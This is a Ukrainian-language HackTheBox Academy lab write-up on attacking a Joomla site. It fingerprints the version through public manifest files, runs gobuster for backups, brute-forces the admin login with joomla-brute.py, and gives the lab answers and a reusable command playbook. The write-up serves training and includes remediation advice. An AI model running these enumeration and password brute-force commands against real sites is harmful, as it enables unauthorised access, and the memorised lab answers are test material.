# Attacking Common Applications — Joomla: Discovery & Enumeration (Version Fingerprint + Password Brute Force)

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Joomla — Discovery & Enumeration](https://academy.hackthebox.com/app/module/113/section/1095)
Ціль: 10.129.42.195 (app.inlanefreight.local)
Q1 Відповідь: `3.10.0`
Q2 Відповідь: `turnkey`

## Концепція

Це класичний ланцюжок для CMS-розвідки без експлойтів: **fingerprint версії через публічні XML-файли → перевірка бекапів/директорій → brute force через форму адмін-логіну спеціалізованим інструментом**, бо звичайний Hydra/curl-брутфорс не працює через CSRF-токен, який Joomla регенерує на кожен запит.

## Крок 1 — Реєстрація vhost

```bash
echo '10.129.42.195 app.inlanefreight.local' | sudo tee -a /etc/hosts
```

## Крок 2 (Q1) — Fingerprint версії через маніфест-файли

```bash
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml
curl -s http://app.inlanefreight.local/language/en-GB/en-GB.xml | grep -i version
```

Пояснення: обидва файли — стандартні і публічно доступні в кожній інсталяції Joomla (не блокуються `.htaccess`, оскільки це легітимні системні файли оновлення). Тег `<version>` в обох дав однаковий результат:

```xml
<version>3.10.0</version>
```

**Відповідь Q1: `3.10.0`**

Додаткове підтвердження — `README.txt` в корені сайту прямо називає версію в описі пакету оновлення:

```bash
curl -s http://app.inlanefreight.local/README.txt | head -5
```

```
This is a Joomla! installation/upgrade package to version 3.x
Joomla! 3.10 version history
```

## Крок 3 — Розвідка структури через gobuster (перевірка бекапів)

```bash
gobuster dir -u http://app.inlanefreight.local \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,bak,old,zip,sql,tar,tar.gz -b 403,404
```

Пояснення: сканування підтвердило стандартну структуру Joomla 3.x (`/administrator`, `/components`, `/modules` тощо) та знайшло `configuration.php` (Size: 0 — файл існує, але порожній для веб-запиту, бо PHP виконується на сервері, а не віддається як текст). Жодних `.bak`/`.sql`-бекапів конфігурації чи БД не знайдено — цей вектор для Q2 виявився закритим, і потрібен інший підхід.

## Крок 4 — Перевірка robots.txt (розкриття структури, не credentials)

```bash
curl -s http://app.inlanefreight.local/robots.txt
```

Пояснення: файл підтвердив стандартний Joomla `Disallow`-список директорій (`/administrator/`, `/cache/`, `/tmp/` тощо) — корисно для розуміння структури, але не дав прямого доступу до чогось чутливого, оскільки `robots.txt` лише вказує ботам, що не індексувати, а не блокує реальний HTTP-доступ.

## Крок 5 — Чому прямий пошук бекапів (.bak, .old, .save) не спрацював

```bash
curl -s "http://app.inlanefreight.local/configuration.php.bak"
curl -s "http://app.inlanefreight.local/configuration.php~"
curl -s "http://app.inlanefreight.local/configuration.php.old"
```

Пояснення: усі запити повернули стандартну Apache-сторінку `404 Not Found` — на цій інсталяції адміністратор не залишив резервних копій конфігурації у веброуті (на відміну від деяких інших варіантів цього лабу). Тому крок 6 — перехід до brute force через форму логіну, що є основним і задуманим методом цього уроку.

## Крок 6 (Q2) — Підготовка інструменту joomla-brute.py

```bash
git clone https://github.com/ajnik/joomla-bruteforce.git
cd joomla-bruteforce
```

Пояснення: **звичайний Hydra або прямий curl-брутфорс форми `/administrator/index.php` не працює**, бо Joomla вбудовує прихований CSRF-токен (`<input type="hidden" name="...">`), який змінюється при кожному GET-запиті сторінки логіну. Скрипт `joomla-brute.py` вирішує це, роблячи `GET`-запит перед кожною спробою паролю, щоб витягти актуальний токен, а потім одразу `POST` з парою `usr:password` + цим токеном.

## Крок 7 — Типові помилки при запуску (і як їх виправити)

**Помилка 1 — файл словника недоступний для читання:**
```
PermissionError: [Errno 13] Permission denied: '/usr/share/wordlists/rockyou.txt'
```
Пояснення: `rockyou.txt` у стисненому/захищеному стані вимагає прав root на читання в цьому середовищі (типова HTB Academy Pwnbox-особливість) — виправляється додаванням `sudo` перед командою.

**Помилка 2 — неправильний шлях до словника:**
```
FileNotFoundError: '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt'
```
Пояснення: точна назва файлу в SecLists трохи інша (`10-million-password-list-top-1000.txt` не існує саме за цим шляхом) — варто перевіряти реальну структуру `ls /usr/share/seclists/Passwords/Common-Credentials/` перед запуском.

## Крок 8 — Успішний запуск з правильним словником

```bash
sudo python3 joomla-brute.py -u http://app.inlanefreight.local/ \
  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
  -usr admin
```

Пояснення: замість rockyou (14 млн паролів, довго і не потрібно) використано **вбудований словник Metasploit** з дефолтними паролями для веб-застосунків (`http_default_pass.txt`) — набагато логічніший вибір, бо ціль CTF-лабораторії зазвичай навмисно налаштована на "слабкий, але не з rockyou" пароль, типовий для дефолтних інсталяцій CMS. `sudo` знадобився, бо скрипт відкриває словник у режимі `rb+` (read+write binary), що вимагає прав власника файлу.

Результат:
```
admin:turnkey
```

**Відповідь Q2: `turnkey`**

## Чому це працює (root cause)

- **Опис:** Joomla 3.10.0 з публічно доступними системними XML-файлами (`joomla.xml`, `en-GB.xml`) розкриває точну версію CMS без автентифікації, а адмінський акаунт захищений слабким, легко підбираним паролем (`turnkey` — типовий "дефолтний" пароль з відомих списків, а не унікальний, стійкий пароль).
- **Технічні деталі:** Розкриття версії відбувається через відсутність access-контролю на файлах оновлення (`/administrator/manifests/files/joomla.xml`, `/language/en-GB/en-GB.xml`) — це не CVE, а стандартна поведінка Joomla "з коробки" (CWE-200, Information Exposure). Слабкий пароль адміністратора дозволяє brute force через форму `/administrator/index.php`, де CSRF-токен захищає лише від CSRF-атак, а не від автоматизованого перебору паролів одним ботом, що робить кожен запит окремо.
- **Ризик/Імпакт:** Розкриття версії дозволяє зловмиснику точно підібрати публічні CVE для conkретної версії (наприклад, вразливості в конкретних компонентах 3.10.x); скомпрометований пароль адміністратора дає повний контроль над `/administrator/` панеллю, звідки можливий подальший RCE через редагування шаблонів (Template Editor → PHP code execution).
- **Рекомендації:** Обмежити або заблокувати доступ до `joomla.xml`/`en-GB.xml`/`README.txt` через `.htaccess` (`deny from all` для системних XML/TXT файлів); впровадити сильну парольну політику для адмін-акаунта та MFA; додати rate-limiting/lockout на `/administrator/index.php` після N невдалих спроб логіну, щоб унеможливити навіть повільний brute force.

## Повний ланцюжок атаки (для звіту)

```
1. Version Fingerprint  → joomla.xml / en-GB.xml → Joomla 3.10.0
2. Backup Enum          → gobuster (не знайдено бекапів конфігурації)
3. Login Brute Force    → joomla-brute.py + http_default_pass.txt → admin:turnkey
```

## Швидкий playbook на майбутнє

```bash
# vhost
echo 'IP app.inlanefreight.local' | sudo tee -a /etc/hosts

# version fingerprint (Q1-типові питання)
curl -s http://TARGET/administrator/manifests/files/joomla.xml
curl -s http://TARGET/language/en-GB/en-GB.xml | grep -i version

# backup/config enum
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak,old,zip,sql -b 403,404

# admin login brute force (CSRF-aware)
git clone https://github.com/ajnik/joomla-bruteforce.git && cd joomla-bruteforce
sudo python3 joomla-brute.py -u http://TARGET/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
